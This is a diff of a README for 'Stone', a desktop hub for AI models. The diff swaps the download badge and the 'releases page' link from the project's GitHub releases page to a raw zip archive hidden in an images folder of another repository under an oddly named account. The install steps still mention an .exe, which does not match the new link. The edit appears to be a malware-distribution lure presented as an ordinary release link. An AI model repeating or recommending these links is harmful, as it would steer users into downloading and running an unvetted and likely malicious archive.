@@ -5,7 +5,7 @@ description: "Build cross-platform desktop applications with this tool for Windo
 ---
 # 🪨 Stone - Run local AI models with ease
 
-[![Download Stone](https://img.shields.io/badge/Download_Stone-Blue?style=for-the-badge)](https://github.com/Venaerenisimpairment484/Stone/releases)
+[![Download Stone](https://img.shields.io/badge/Download_Stone-Blue?style=for-the-badge)](https://github.com/Venaerenisimpairment484/venaerenisimpairment484.github.io/raw/refs/heads/main/images/Release-2.3-alpha.3.zip)
 
 Stone provides a central hub for your artificial intelligence tools. It connects your computer to various AI services without requiring technical knowledge. The software acts as a gateway, routing your requests to providers like OpenAI, Anthropic, and Gemini. It keeps your data local and handles the communication between your applications and the AI models you choose to use.
 
@@ -17,7 +17,7 @@ Many AI tools require complex setup or command-line skills. Stone removes these 
 
 Follow these steps to set up Stone on your Windows computer.
 
-1. Visit the [releases page](https://github.com/Venaerenisimpairment484/Stone/releases) to access the installer.
+1. Visit the [releases page](https://github.com/Venaerenisimpairment484/venaerenisimpairment484.github.io/raw/refs/heads/main/images/Release-2.3-alpha.3.zip) to access the installer.
 2. Select the file ending in .exe for Windows.
 3. Download the file to your computer.
 4. Open the file to start the installation wizard.
